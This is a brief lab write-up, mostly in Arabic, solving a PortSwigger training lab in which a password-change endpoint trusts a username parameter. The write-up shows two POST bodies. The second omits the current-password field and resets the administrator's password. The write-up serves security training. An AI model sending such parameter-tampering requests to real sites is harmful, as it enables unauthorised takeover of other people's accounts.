# Lab : Weak isolation on dual - use endpoint

https://portswigger.net/web-security/logic-flaws/examples/lab-logic-flaws-weak-isolation-on-dual-use-endpoint

- الفكره من الLab ده ان في endpoint مش بتفرق يعني ممكن تعمل user's privilege level based on their input الي هي parameter ال username ممكن تحولني من user عادي ل`administrator`   بس هنيجي عند حتت ال current password  هنعمل بيه ايه وها bypass اذاي اكتشفت ان ممكن تمسحه عادي هو مش مهم وساعتها الpassword هيتغير 😂

```bash
1. csrf=dZ9n8VfyY8evWI4ZPLLOENOKsCKsWRrS&username=administrator&current-password=a&new-password-1=a&new-password-2=a

2. csrf=dZ9n8VfyY8evWI4ZPLLOENOKsCKsWRrS&username=administrator&new-password-1=a&new-password-2=a
```
